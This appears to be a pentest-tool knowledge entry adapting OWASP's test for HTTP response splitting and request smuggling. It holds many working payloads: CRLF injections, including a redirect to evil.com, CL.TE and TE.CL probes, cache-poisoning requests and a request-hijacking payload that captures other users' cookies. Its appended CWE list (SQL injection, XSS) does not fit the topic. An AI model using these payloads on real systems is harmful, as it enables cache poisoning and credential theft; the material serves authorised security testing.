---
id: WSTG-INPV-15
title: Testing for HTTP Splitting/Smuggling
category: Input Validation
severity_range: High-Critical
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling
---

# WSTG-INPV-15: Testing for HTTP Splitting/Smuggling

## Summary

HTTP Splitting and HTTP Smuggling are attacks that exploit inconsistencies in how HTTP messages are parsed by different components in the request processing chain (proxies, load balancers, CDNs, web servers). HTTP Response Splitting occurs when an attacker injects CRLF characters into HTTP headers, splitting a single response into multiple responses. HTTP Request Smuggling exploits discrepancies in how front-end and back-end servers determine the boundaries of HTTP requests -- specifically disagreements about Content-Length (CL) and Transfer-Encoding (TE) headers. These attacks can lead to cache poisoning, session hijacking, request routing manipulation, and bypassing security controls.

## Test Objectives

- Test if CRLF injection is possible in HTTP response headers
- Determine if the infrastructure is vulnerable to CL.TE or TE.CL request smuggling
- Identify discrepancies in HTTP parsing between front-end and back-end servers
- Assess the potential for cache poisoning, session hijacking, or access control bypass

## Prerequisites

- Target application is behind a reverse proxy, load balancer, or CDN
- Docker pentest container capturing traffic
- Understanding of the infrastructure topology (proxy/server chain)
- Familiarity with HTTP/1.1 specification for Content-Length and Transfer-Encoding

## Test Steps

### Step 1: Test for HTTP Response Splitting (CRLF Injection)

**CLI Actions:**
1. Use `curl` to identify parameters that are reflected in HTTP response headers (e.g., Set-Cookie, Location, custom headers)
2. Use `curl` to inject CRLF sequences into header-reflected parameters:

**CRLF in redirect parameter:**
```
GET /redirect?url=https://target.com%0d%0aInjected-Header:+injected HTTP/1.1
Host: target.com
```

**CRLF to inject a full response:**
```
GET /redirect?url=https://target.com%0d%0a%0d%0aHTTP/1.1+200+OK%0d%0aContent-Type:+text/html%0d%0a%0d%0a<html>Injected</html> HTTP/1.1
Host: target.com
```

3. Check if the `Injected-Header` appears in the response headers
4. Use `curl --data-urlencode` and `python3 -c "import urllib.parse; ..."` to test various CRLF encoding patterns

### Step 2: Test CRLF Encoding Variations

**CLI Actions:**
Use `curl` to test various CRLF encodings that may bypass filters:

```
GET /redirect?url=value%0d%0aInjected:+header HTTP/1.1
Host: target.com
```

```
GET /redirect?url=value%0d%0aInjected:+header HTTP/1.1
Host: target.com
```

```
GET /redirect?url=value%E5%98%8A%E5%98%8DInjected:+header HTTP/1.1
Host: target.com
```

```
GET /redirect?url=value%c0%8d%c0%8aInjected:+header HTTP/1.1
Host: target.com
```

Use `curl --data-urlencode` as needed for different encoding schemes.

### Step 3: Test for CL.TE Request Smuggling

**CLI Actions:**
In CL.TE smuggling, the front-end uses Content-Length and the back-end uses Transfer-Encoding. Use `curl`:

**Detection probe:**
```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

If the back-end processes the chunked encoding, the trailing `G` becomes the start of the next request. A second normal request sent immediately after should receive an unexpected response (e.g., "Unrecognized method GPOST").

**Confirming CL.TE with time delay:**
```
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```

If there is a time delay, the back-end is waiting for the next chunk terminator, confirming CL.TE desync.

### Step 4: Test for TE.CL Request Smuggling

**CLI Actions:**
In TE.CL smuggling, the front-end uses Transfer-Encoding and the back-end uses Content-Length. Use `curl`:

**Detection probe:**
```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

**Confirming TE.CL with time delay:**
```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

If the front-end processes chunked encoding (terminates at `0\r\n\r\n`) but the back-end uses Content-Length (reads 6 bytes including `0\r\n\r\nX`), a desync occurs.

### Step 5: Test Transfer-Encoding Obfuscation

**CLI Actions:**
Servers may disagree on which TE header to honor when obfuscated. Use `curl` with variations:

```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked
Transfer-Encoding: cow

8
SMUGGLED
0


```

```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked
Transfer-encoding: x

8
SMUGGLED
0


```

```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding : chunked

8
SMUGGLED
0


```

```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: xchunked

8
SMUGGLED
0


```

```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding:[tab]chunked

8
SMUGGLED
0


```

### Step 6: Test for Smuggling-Based Cache Poisoning

**CLI Actions:**
If smuggling is confirmed, use `curl` to test cache poisoning:

**CL.TE cache poisoning:**
```
POST / HTTP/1.1
Host: target.com
Content-Length: 128
Transfer-Encoding: chunked

0

GET /static/cached-page HTTP/1.1
Host: target.com
X-Ignore: X
```

Then immediately request the cached page:
```
GET /static/cached-page HTTP/1.1
Host: target.com
```

If the cached response contains smuggled content, cache poisoning is confirmed.

### Step 7: Test for Smuggling-Based Request Hijacking

**CLI Actions:**
Use `curl` to test if another user's request can be captured:

```
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

POST /api/store HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

data=
```

The next legitimate request from another user will be appended to the `data` parameter, potentially capturing their cookies and credentials.

Use `rynix_plugin_run('template-scan')` to check if the template-scan plugin has detected any HTTP desync or smuggling issues.

## Payloads

### CRLF Injection Payloads
```
%0d%0aInjected-Header:+value
%0d%0a%0d%0a<html>Injected</html>
%0d%0aSet-Cookie:+session=hijacked
%0d%0aLocation:+https://evil.com
\r\nInjected-Header: value
%E5%98%8A%E5%98%8DInjected-Header:+value
%c0%8d%c0%8aInjected-Header:+value
```

### CL.TE Smuggling Payloads
```
POST / HTTP/1.1
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

```
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL Smuggling Payloads
```
POST / HTTP/1.1
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

### Transfer-Encoding Obfuscation Payloads
```
Transfer-Encoding: chunked
Transfer-Encoding : chunked
Transfer-Encoding: xchunked
Transfer-Encoding: chunked (with trailing space)
Transfer-Encoding:[tab]chunked
Transfer-Encoding:
 chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding: cow
```

### Cache Poisoning via Smuggling
```
POST / HTTP/1.1
Content-Length: [calculated]
Transfer-Encoding: chunked

0

GET /poisoned-path HTTP/1.1
Host: target.com
Content-Length: 10

x=1
```

### Request Hijacking via Smuggling
```
POST / HTTP/1.1
Content-Length: [calculated]
Transfer-Encoding: chunked

0

POST /capture HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

stolen=
```

### Automated CRLF Injection Testing with crlfuzz

**CLI Actions:**
Use `crlfuzz` to test for CRLF injection across all discovered URLs:

```bash
# Test a single URL
rynix_plugin_run('wstg') crlfuzz -u "https://target.com/redirect?url=test"

# Test all URLs from crawler output
rynix_plugin_run('wstg') sh -c 'cat ./engagements/<eid>/tool-output/web-crawler.txt | crlfuzz -o ./engagements/<eid>/tool-output/crlfuzz.txt'
```

crlfuzz has a moderate false-positive rate — verify all findings manually by checking for injected headers in the response.

### Automated HTTP Request Smuggling Testing with smuggler

**CLI Actions:**
Use `smuggler` to detect CL.TE and TE.CL desync vulnerabilities:

```bash
rynix_plugin_run('wstg') python3 /opt/smuggler/smuggler.py -u https://target.com
```

**Important**: Do NOT route smuggler traffic through an HTTP proxy — smuggling detection requires direct connection to observe discrepancies between front-end and back-end servers.

smuggler has a low false-positive rate but findings are complex to verify. Test manually with carefully crafted requests to confirm desync behavior.

## Detection Criteria

A finding should be logged when:
- CRLF injection successfully adds headers to the HTTP response
- HTTP response splitting creates a second response with attacker-controlled content
- Request smuggling probes cause unexpected responses on subsequent requests
- Time-based detection confirms CL.TE or TE.CL desync
- Cache poisoning is achieved through smuggled requests
- Request hijacking captures another user's request data

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Request smuggling enables cache poisoning affecting all users | Critical |
| Request smuggling captures other users' requests/credentials | Critical |
| HTTP response splitting enables session fixation or XSS | High |
| CL.TE or TE.CL desync confirmed but exploitation limited | High |
| CRLF injection in headers without full response splitting | Medium |
| Transfer-Encoding discrepancy detected but not exploitable | Medium |
| CRLF characters filtered but encoding variations not fully tested | Low |

## Remediation

- Normalize HTTP requests at the front-end proxy, rejecting ambiguous requests
- Configure front-end and back-end to use the same method for determining request boundaries
- Disable support for Transfer-Encoding: chunked if not needed
- Reject requests that contain both Content-Length and Transfer-Encoding headers
- Use HTTP/2 end-to-end (HTTP/2 has a different framing mechanism not vulnerable to CL/TE desync)
- Strip or reject CRLF characters in user input before incorporating into response headers
- Sanitize all user input reflected in HTTP headers
- Use web servers and proxies that strictly conform to HTTP/1.1 specification
- Regularly test for desync vulnerabilities after infrastructure changes

## References

- [OWASP Testing Guide - HTTP Splitting/Smuggling](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling)
- [technique Research - HTTP Request Smuggling](https://owasp.org/research/http-request-smuggling)
- [CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers](https://cwe.mitre.org/data/definitions/113.html)
- [CWE-444: Inconsistent Interpretation of HTTP Requests](https://cwe.mitre.org/data/definitions/444.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V5 Validation — input handling and parser differentials.
- V12 Files and Resources — upload and inclusion controls.

## CWE references

- CWE-20: Improper Input Validation
- CWE-89: SQL Injection
- CWE-79: Cross-site Scripting

## Rynix tooling

- Primary tools: ``http_probe``, ``rynix_plugin_run` (template-scan)`, ``record_finding``

## Test focus

- Fuzz parameters with encoding variants (URL, Unicode, double-encoding).
- Switch Content-Type to traverse alternate validators.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

